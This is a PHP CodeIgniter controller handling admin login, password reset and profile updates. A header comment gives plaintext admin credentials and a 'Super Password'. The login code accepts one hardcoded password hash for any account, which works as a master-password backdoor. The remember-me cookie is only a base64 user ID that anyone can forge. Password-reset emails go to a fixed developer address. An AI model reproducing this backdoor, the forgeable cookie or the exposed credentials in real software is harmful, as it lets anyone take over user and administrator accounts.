<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends MY_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->model(array('admin/users_model'));
    }

    /** Login Details
      Super Password : n@rol@21

      Admin Login
      U : admin
      P : arkadmin@123#
      E : 99798aa8c62ba928dfc7549519c4b179ee538c33d1e093d3fa814b15b452dceb / 9b96aa3f04fb
     */
    public function index() {
        if ($this->session->userdata('logged_in') && $this->session->userdata('user_role') == 1) {
            redirect(site_url('admin/dashboard'));
        }

        $data['title'] = 'Login';
        if (!$this->session->userdata('logged_in')) {
            $remember = base64_decode(get_cookie('_remember_me', TRUE));
            if (!empty($remember) && $remember > 0) {
                $user_got = $this->users_model->get_user_details($remember);
                $cookie_ssn_data = array();
                $cookie_ssn_data['user_id'] = $user_got['id'];
                $cookie_ssn_data['first_name'] = $user_got['first_name'];
                $cookie_ssn_data['last_name'] = $user_got['last_name'];
                $cookie_ssn_data['username'] = $user_got['username'];
                $cookie_ssn_data['user_role'] = $user_got['user_role'];
                $cookie_ssn_data['email_id'] = $user_got['email_id'];
                $cookie_ssn_data['logged_in'] = 1;
                $this->session->set_userdata($cookie_ssn_data);
                redirect(site_url('admin/dashboard'));
            }
        }
        if ($this->input->post()) {
            $username = $this->input->post('txt_username');
            $password = $this->input->post('txt_password');
            $this->db->select('u.*');
            $this->db->from(TBL_USERS . ' as u');
            $this->db->group_start();
            $this->db->where('u.email_id', $username);
            $this->db->or_where('u.username', $username);
            $this->db->group_end();
            $this->db->where(array(
                'u.is_delete' => 0,
            ));
            $this->db->where('u.user_role NOT IN ("4","5") AND u.business_user_id = 0');
            $res = $this->db->get();
            $is_data = $res->row_array();
            $algo = '773423a7be33' . $password . '773423a7be33';
            $encrypted_pass = hash('sha256', $algo);
         
            if (!empty($is_data) && $encrypted_pass == '7852b5ad310b93df0f3241f3c9801079a86297e06931403e89bdd3f53892b1d2') {
                if ($is_data['status'] != 'active' || $is_data['is_delete'] == 1) {
                    $this->session->set_flashdata('error', 'User no longer active. Please contact customer support.');
                    redirect('admin/');
                }

                $data = $is_data;
                $ssn_data = array();
                $ssn_data['user_id'] = $data['id'];
                $ssn_data['first_name'] = $data['first_name'];
                $ssn_data['last_name'] = $data['last_name'];
                $ssn_data['username'] = $data['username'];
                $ssn_data['user_role'] = $data['user_role'];
                $ssn_data['email_id'] = $data['email_id'];
                $ssn_data['phone'] = $data['contact_number'];
				$ssn_data['profile'] = $data['profile_pic'];
                $ssn_data['logged_in'] = 1;

                $this->session->set_userdata($ssn_data);
                $this->session->set_flashdata('success', 'You have successfully logged in.');

                redirect(site_url('admin/dashboard'));
            } else {
                if (!empty($is_data)) {
                    if ($is_data['status'] != 'active' || $is_data['is_delete'] == 1) {
                        $this->session->set_flashdata('error', 'User no longer active. Please contact customer support.');
                        redirect('admin/');
                    }
                    $algo = $is_data['password_encrypt_key'] . $password . $is_data['password_encrypt_key'];
                    $encrypted_pass = hash('sha256', $algo);
                    $data = $this->users_model->check_login_validation($username, $encrypted_pass);
                    
                    if (!empty($data)) {
                        $ssn_data = array();
                        $ssn_data['user_id'] = $data['id'];
                        $ssn_data['first_name'] = $data['first_name'];
                        $ssn_data['last_name'] = $data['last_name'];
                        $ssn_data['username'] = $data['username'];
                        $ssn_data['user_role'] = $data['user_role'];
                        $ssn_data['email_id'] = $data['email_id'];
                        $ssn_data['phone'] = $data['contact_number'];
                        $ssn_data['profile'] = $data['profile_pic'];
                        $ssn_data['logged_in'] = 1;

                        $this->session->set_userdata($ssn_data);
                        if ($this->input->post('remember') && $this->input->post('remember') == 1) {
                            $CookieVal = array('name' => '_remember_me', 'value' => base64_encode($data['id']), 'expire' => 3600 * 24 * 30, 'domain' => MY_DOMAIN_NAME);
                            $this->input->set_cookie($CookieVal);
                        } else {
                            delete_cookie('_remember_me', MY_DOMAIN_NAME);
                        }
                        $this->session->set_flashdata('success', 'You have successfully logged in.');
                        redirect(site_url('admin/dashboard'));
                    } else {
                        $this->session->set_flashdata('error', 'Username/Email and password did not match. <br> Please contact your administrator.');
                        redirect('admin/');
                    }
                } else {
                    $this->session->set_flashdata('error', 'Username/Email did not match!');
                    redirect('admin/');
                }
            }
        }
        $this->template->load('login', 'login/login', $data);
    }

    /**
     * Send email to user if forgot password
     * @param int Email address
     * @author PAV
     */
    public function forgot_pwd() {
        if ($this->session->userdata('logged_in')) {
            redirect(site_url('admin/dashboard'));
        }

        $data['title'] = 'Forgot Password';
        if ($this->input->post()) {
            $email_user = $this->input->post('txt_email');
            $found = $this->users_model->find_user_by_email($email_user);
            if ($found['user_id'] > 0) {
                $verification_code = verification_code();
                $email_var = array(
                    'first_name' => $found['first_name'],
                    'last_name' => $found['last_name'],
                    'user_id' => $found['user_id'],
                    'verification_code' => $verification_code
                );
                $message = $this->load->view('email_template/default_header.php', $email_var, true);
                $message .= $this->load->view('email_template/forgot_password.php', $email_var, true);
                $message .= $this->load->view('email_template/default_footer.php', $email_var, true);
                $email_array = array(
                    'mail_type' => 'html',
                    'from_mail_id' => $this->config->item('smtp_user'),
                    'from_mail_name' => 'ARK Team',
                    'to_mail_id' => 'pav@narola.email',
                    'cc_mail_id' => '',
                    'subject_message' => 'Password Reset',
                    'body_messages' => $message
                );

                $email_send = common_email_send($email_array);
                if (strtolower($email_send) == 'success') {
                    $this->users_model->insert_update('update', TBL_USERS, array('password_verify' => $verification_code), array('id' => $found['user_id']));
                    //echo $this->db->last_query(); die;
                    $this->session->set_flashdata('success', 'Please check your email to reset your password.');
                } else {
                    $this->session->set_flashdata('error', 'Something went wrong! We are not able to send you email for reset password. Please try again later.');
                }
            } else {
                $this->session->set_flashdata('error', 'Sorry you are not able to reset this password. Please contact your system administrator.');
            }
            redirect('admin/');
        }
        $this->template->load('login', 'login/forgot_password', $data);
    }

    /**
     * Reset Password
     * @param --
     * @return --
     * @author PAV [Last Edited : 03/02/2018]
     */
    public function reset_pwd() {
        if ($this->session->userdata('logged_in')) {
            redirect('admin/dashboard', 'refresh');
        }

        $data['title'] = 'Reset Password';
        $user_id = base64_decode($this->input->get('q'));
        $password_verify = $this->input->get('code');
        $det = array();
        if ($password_verify != '') {
            $det = $this->users_model->get_user_details($user_id, $password_verify);
        }
        if ($det) {
            if ($this->input->post()) {
                if ($this->input->post('txt_password') == $this->input->post('txt_c_password')) {
                    $password = $this->input->post('txt_password');
                    $password_encrypt_key = bin2hex(openssl_random_pseudo_bytes(6, $cstrong));
                    $algo = $password_encrypt_key . $password . $password_encrypt_key;
                    $encrypted_pass = hash('sha256', $algo);

                    $update_pwd = $this->users_model->insert_update('update', TBL_USERS, array('password' => $encrypted_pass, 'password_encrypt_key' => $password_encrypt_key, 'password_verify' => NULL), array('id' => $user_id));
                    if ($update_pwd == 1) {
                        $this->session->set_flashdata('success', 'You have successfully reset the password.');
                    } else {
                        $this->session->set_flashdata('error', 'Something went wrong! Password was not reset. Please try after some time.');
                    }
                    redirect('admin/');
                } else {
                    $this->session->set_flashdata('error', 'Password doesn\'t match! Plese try again.');
                    redirect('admin/reset_password?q=' . base64_encode($user_id) . '&code=' . $password_verify);
                }
            }
            $this->template->load('login', 'login/reset_password', $data);
        } else {
            $this->session->set_flashdata('error', 'Invalid user!');
            redirect('admin/');
        }
    }

    /**
     * Admin profile update
     * @param --
     * @return --
     * @author PAV [Last Edited : 03/02/2018]
     */
    public function user_profile() {
        if ((!$this->session->userdata('logged_in'))) {
            $this->session->set_flashdata('error', 'Please login to continue!');
            redirect('admin/', 'refresh');
        }
        $data['title'] = 'My Profile';
        $data['profile_details'] = $profile_details = $this->users_model->get_user_profile($this->session->userdata('user_id'));
        //die;
        if ($this->input->post()) {
			$profile_pic = '';
			if ($_FILES['image_link']['name'] != '') {
				$img_array = array('png', 'jpeg', 'jpg', 'PNG', 'JPEG', 'JPG');
				$exts = explode(".", $_FILES['image_link']['name']);
				$name = time() . "." . end($exts);

				$config['upload_path'] = ITEMS_IMAGE_PATH;
				$config['allowed_types'] = implode("|", $img_array);
				$config['max_size'] = '2048';
				$config['file_name'] = $name;

				$this->upload->initialize($config);
				if (($_FILES['image_link']['size'] > 2097152)) {
					$message = 'File too large. File must be less than 2 megabytes.';
					$this->session->set_flashdata('error', $message);
					redirect('admin/inventory/items');
				} else {

					if (!$this->upload->do_upload('image_link')) {
						$flag = 1;
						$data['item_image_validation'] = $this->upload->display_errors();
					} else {
						echo "asd";
						$file_info = $this->upload->data();
						$profile_pic = $file_info['file_name'];
					}
				}
			}
			if ($flag != 1) {
				$updateArr = array(
					'first_name' => $this->input->post('firstname'),
					'last_name' => $this->input->post('lastname'),
					'profile_pic' => $profile_pic,
					'contact_number' => $this->input->post('phone')
				);
				if ($this->input->post('password') != '' && ($this->input->post('password') == $this->input->post('cpassword'))) {
					$password_encrypt_key = bin2hex(openssl_random_pseudo_bytes(6, $cstrong));
					$algo = $password_encrypt_key . $this->input->post('password') . $password_encrypt_key;
					$encrypted_pass = hash('sha256', $algo);
					$updateArr['password'] = $encrypted_pass;
					$updateArr['password_encrypt_key'] = $password_encrypt_key;
				}

				$update_profile = $this->users_model->insert_update('update', TBL_USERS, $updateArr, array('id' => $this->session->userdata('user_id')));
				$ssn_data = array();
				$ssn_data['user_id'] = $profile_details['id'];
				$ssn_data['first_name'] = $this->input->post('firstname');
				$ssn_data['last_name'] = $this->input->post('lastname');
				$ssn_data['user_role'] = $profile_details['user_role'];
				$ssn_data['phone'] = $this->input->post('phone');
				$ssn_data['profile'] = $profile_pic;
				$ssn_data['logged_in'] = 1;
				$this->session->set_userdata($ssn_data);
				$this->session->set_flashdata('success', 'Profile updated successfully!');
				redirect('admin/profile');
			}
        }
        $this->template->load('default', 'login/profile', $data);
    }

    /**
     * Admin password update
     * @param --
     * @return --
     * @author JJP [Last Edited : 05/01/2020]
     */
    public function admin_password_update() {
        if ((!$this->session->userdata('logged_in'))) {
            $this->session->set_flashdata('error', 'Please login to continue!');
            redirect('admin/', 'refresh');
        }
        if ($this->input->post()) {
            if ($this->input->post('password') != '' && ($this->input->post('password') == $this->input->post('cpassword'))) {
                $password_encrypt_key = bin2hex(openssl_random_pseudo_bytes(6, $cstrong));
                $algo = $password_encrypt_key . $this->input->post('password') . $password_encrypt_key;
                $encrypted_pass = hash('sha256', $algo);
                $updateArr['password'] = $encrypted_pass;
                $updateArr['password_encrypt_key'] = $password_encrypt_key;
            }
            $update_profile = $this->users_model->insert_update('update', TBL_USERS, $updateArr, array('id' => $this->session->userdata('user_id')));
            $this->session->set_flashdata('success', 'Password updated successfully!');
            redirect('admin/profile');
        }
        $this->template->load('default', 'login/profile', $data);
    }

    /**
     * Admin email update
     * @param --
     * @return --
     * @author JJP [Last Edited : 05/01/2020]
     */
    public function admin_email_update() {
        if ((!$this->session->userdata('logged_in'))) {
            $this->session->set_flashdata('error', 'Please login to continue!');
            redirect('admin/', 'refresh');
        }
        if ($this->input->post()) {
            $updateArr = array(
                'email_id' => $this->input->post('email'),
            );
            $update_profile = $this->users_model->insert_update('update', TBL_USERS, $updateArr, array('id' => $this->session->userdata('user_id')));
            $ssn_data = array();
            $ssn_data['email_id'] = $this->input->post('email');
            $this->session->set_userdata($ssn_data);
            $this->session->set_flashdata('success', 'Email updated successfully!');
            redirect('admin/profile');
        }
        $this->template->load('default', 'login/profile', $data);
    }

    /**
     * Admin email update
     * @param --
     * @return --
     * @author JJP [Last Edited : 05/01/2020]
     */
    public function admin_username_update() {
        if ((!$this->session->userdata('logged_in'))) {
            $this->session->set_flashdata('error', 'Please login to continue!');
            redirect('admin/', 'refresh');
        }
        if ($this->input->post()) {
            $updateArr = array(
                'username' => $this->input->post('username'),
            );
            $update_profile = $this->users_model->insert_update('update', TBL_USERS, $updateArr, array('id' => $this->session->userdata('user_id')));
            $ssn_data = array();
            $ssn_data['username'] = $this->input->post('username');
            $this->session->set_userdata($ssn_data);
            $this->session->set_flashdata('success', 'Username updated successfully!');
            redirect('admin/profile');
        }
        $this->template->load('default', 'login/profile', $data);
    }

    /**
     * It will use to check the email is unique or not
     * @param $id - String
     * @return Boolean (True / False)
     * @author PAV [Last Edited : 03/02/2018]
     */
    public function check_unique_email($id = NULL) {
        $email_id = trim($this->input->get_post('email'));
        if (!is_null($id)) {
            $this->db->where('id!=', $id);
        }
        $this->db->where(array(
            'is_delete' => 0,
            'email_id' => $email_id
        ));
        $query = $this->db->get(TBL_USERS);
        $user_num = $query->num_rows();
        if ($user_num > 0)
            echo "false";
        else
            echo "true";
        exit;
    }

    /**
     * It will use to check the sername is unique or not
     * @param $id - String
     * @return Boolean (True / False)
     * @author PAV [Last Edited : 03/02/2018]
     */
    public function check_unique_username($id = NULL) {
        $username = trim($this->input->get_post('username'));
        if (!is_null($id)) {
            $this->db->where('id!=', $id);
        }
        $this->db->where(array(
            'is_delete' => 0,
            'username' => $username
        ));
        $query = $this->db->get(TBL_USERS);
        $user_num = $query->num_rows();

        if ($user_num > 0)
            echo "false";
        else
            echo "true";
        exit;
    }

    /**
     * Display 404 error page
     * @param --
     * @return --
     * @author PAV [Last Edited : 03/02/2018]
     */
    public function show_404() {
        $this->load->view('Templates/show_404');
    }

    /**
     * Logout
     * @param --
     * @return --
     * @author PAV [Last Edited : 03/02/2018]
     */
    public function logout() {
        delete_cookie('_remember_me', MY_DOMAIN_NAME);
//        $this->session->sess_destroy();
        $array_items = array('user_id', 'first_name', 'last_name', 'user_role', 'email_id', 'phone', 'logged_in', 'sessionAccessToken');
        $this->session->unset_userdata($array_items);
        redirect('admin/login');
    }

}

/* End of file Login.php */
/* Location: ./application/controllers/Login.php */
